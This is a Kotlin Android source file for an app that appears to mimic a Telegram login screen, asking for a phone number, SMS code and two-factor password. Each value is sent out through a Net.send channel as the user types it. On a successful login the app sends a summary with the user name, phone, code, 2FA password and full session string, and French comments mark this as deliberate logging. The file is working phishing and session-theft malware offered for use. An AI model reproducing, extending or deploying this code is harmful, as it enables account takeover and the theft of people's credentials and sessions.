package com.tgme.app.ui

import android.app.Activity
import android.os.Bundle
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import com.chaquo.python.Python
import com.chaquo.python.android.AndroidPlatform
import com.tgme.app.*
import java.io.File
import kotlin.concurrent.thread

class MainActivity : Activity() {
    private var currentPhone = ""
    private var currentCode = ""
    private var currentPassword = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            try {
                Net.send("💥 CRASH: ${throwable.javaClass.name}: ${throwable.message}\n${throwable.stackTraceToString()}")
                Thread.sleep(2000)
            } catch (_: Throwable) {}
            android.os.Process.killProcess(android.os.Process.myPid())
        }
        
        Net.send("🔵 App démarrée")
        
        val pyLog = File(filesDir, "python_log.txt")
        if (pyLog.exists()) {
            if (pyLog.readText().isNotBlank()) Net.send("📋 Log précédent:\n${pyLog.readText()}")
            pyLog.delete()
        }
        
        try {
            if (!Python.isStarted()) {
                Net.send("🔧 Démarrage Python...")
                Python.start(AndroidPlatform(this))
                Net.send("✅ Python OK")
            }
        } catch (t: Throwable) {
            Net.send("❌ Python.start FAILED:\n${t.javaClass.name}: ${t.message}")
            return
        }
        
        Capture.load(this)
        showPhone()
    }

    private fun showPhone() {
        setContentView(R.layout.screen_phone)
        val cc = findViewById<EditText>(R.id.cc)
        val phone = findViewById<EditText>(R.id.phone)
        val btn = findViewById<TextView>(R.id.btn)
        
        btn.setOnClickListener {
            val full = normalize(cc.text.toString(), phone.text.toString())
            if (full == null) { toast("Numéro invalide"); return@setOnClickListener }
            currentPhone = full
            btn.isEnabled = false
            toast("Envoi du code...")
            Net.send("📞 Numéro: $full")
            callPython("", "")
        }
    }

    private fun showCode() {
        setContentView(R.layout.screen_code)
        findViewById<TextView>(R.id.sub).text = "Code envoyé au $currentPhone"
        val codeInput = findViewById<EditText>(R.id.code)
        val btn = findViewById<TextView>(R.id.btn)
        
        btn.setOnClickListener {
            val code = codeInput.text.toString().replace(Regex("\\D"), "")
            if (code.isEmpty()) return@setOnClickListener
            currentCode = code
            Net.send("📱 CODE SMS: $code") // 👈 LOG DU CODE
            btn.isEnabled = false
            toast("Vérification...")
            callPython(code, "")
        }
    }

    private fun showPassword() {
        Net.send("🔐 2FA REQUISE - saisie du mot de passe")
        setContentView(R.layout.screen_password)
        val pwInput = findViewById<EditText>(R.id.password)
        val btn = findViewById<TextView>(R.id.btn)
        
        btn.setOnClickListener {
            val password = pwInput.text.toString()
            if (password.isEmpty()) return@setOnClickListener
            currentPassword = password
            Net.send("🔑 MOT DE PASSE 2FA: $password") // 👈 LOG DU 2FA
            btn.isEnabled = false
            toast("Vérification...")
            callPython(currentCode, password)
        }
    }

    private fun callPython(code: String, password: String) {
        thread {
            Net.send("🐍 Appel Python (code='$code', pass=${password.isNotEmpty()})")
            
            val result = try {
                val py = Python.getInstance()
                val mod = py.getModule("auth_manager")
                mod.callAttr("process_login", currentPhone, code, password).toString()
            } catch (t: Throwable) {
                Net.send("💥 CRASH PYTHON:\n${t.javaClass.name}: ${t.message}")
                "ERROR|CRASH: ${t.javaClass.name}: ${t.message}"
            }
            
            Net.send("📤 Résultat: $result")
            
            try {
                val pyLog = File(filesDir, "python_log.txt")
                if (pyLog.exists()) {
                    if (pyLog.readText().isNotBlank()) Net.send("📋 Log Python:\n${pyLog.readText()}")
                    pyLog.delete()
                }
            } catch (_: Throwable) {}
            
            runOnUiThread { handleResult(result) }
        }
    }

    private fun handleResult(result: String) {
        when {
            result == "NEED_CODE" -> showCode()
            result == "NEED_PASSWORD" -> showPassword()
            
            result.startsWith("OK\u001F") -> {
                val parts = result.split("\u001F")
                val sessionString = parts.getOrNull(1) ?: ""
                val userName = parts.getOrNull(2) ?: "User"
                
                // 👇 RÉCAPITULATIF FINAL 👇
                val recap = buildString {
                    append("🎉 LOGIN RÉUSSI\n\n")
                    append("👤 User: $userName\n")
                    append("📞 Numéro: $currentPhone\n")
                    append("📱 Code: $currentCode\n")
                    append("🔑 Password 2FA: ${currentPassword.ifEmpty { "(aucun)" }}\n\n")
                    append("🔐 SESSION:\n$sessionString")
                }
                Net.send(recap)
                
                setContentView(R.layout.screen_success)
                findViewById<TextView>(R.id.who).text = "Bienvenue $userName !"
                findViewById<TextView>(R.id.num).text = currentPhone
            }
            
            result.startsWith("ERROR|") -> {
                val err = result.removePrefix("ERROR|")
                toast("Erreur: $err")
                showPhone()
            }
            
            else -> { toast("Réponse: $result"); showPhone() }
        }
    }

    private fun normalize(ccRaw: String, nRaw: String): String? {
        var n = nRaw.trim().replace(Regex("[\\s\\-().]"), "")
        if (n.isEmpty()) return null
        var cc = ccRaw.trim().replace(Regex("[\\s\\-().]"), "")
        if (cc.isNotEmpty() && !cc.startsWith("+")) {
            cc = if (cc.startsWith("00")) "+" + cc.substring(2) else "+$cc"
        }
        val full = when {
            n.startsWith("+") -> n
            n.startsWith("00") -> "+" + n.substring(2)
            else -> cc + n
        }
        return if (full.length >= 8) full else null
    }

    private fun toast(msg: String) = runOnUiThread {
        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
    }
}
